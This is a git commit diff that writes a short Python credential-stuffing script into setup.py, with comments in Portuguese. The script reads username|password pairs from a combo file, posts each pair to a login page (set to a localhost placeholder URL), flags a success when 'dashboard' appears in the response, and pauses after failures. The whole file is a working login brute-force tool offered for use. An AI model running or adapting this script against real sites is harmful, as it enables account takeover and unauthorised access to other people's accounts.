13cbca8f89463e4475659a2cdd6b61600c6eca74
Edson Costa <61160635+ecsistem@users.noreply.github.com>
2021-09-12 22:24:35 -0300

    Update setup.py
    Aqui executa a ferramenta

--- setup.py
+++ setup.py
@@ -1,1 +1,29 @@
+# Imports
+import requests
+from time import sleep
+# Classes importadas
+class bcolors:
+    OK = '\033[92m' #GREEN
+    FAIL = '\033[91m' #RED
+    
+req = requests.session()
+url = "http://127.0.0.1/login.php" #Aqui vai a url do site
+a = open("combo.txt", "r") #aqui é o txt da payload
+stop = "default"
+file = [s.rstrip()for s in a.readlines()]
+# print(file)
+for lines in file:
+    combo = lines.split("|")
+    param = {
+        'username': combo[0],
+        'inputpwd': combo[1],#combo[1] ou ''
+        'login' : 'login'
+    }
+    source = req.post(url, data=param)
+#         print(source.text)
+    if("dashboard"in source.text):
+            print(bcolors.OK + "Sucesso!: {}:{}".format(combo[0], combo[1]))
 
+    else: 
+        print(bcolors.FAIL + "Username ou senha errados!:  {}:{}".format(combo[0], combo[1]))
+        sleep(5)
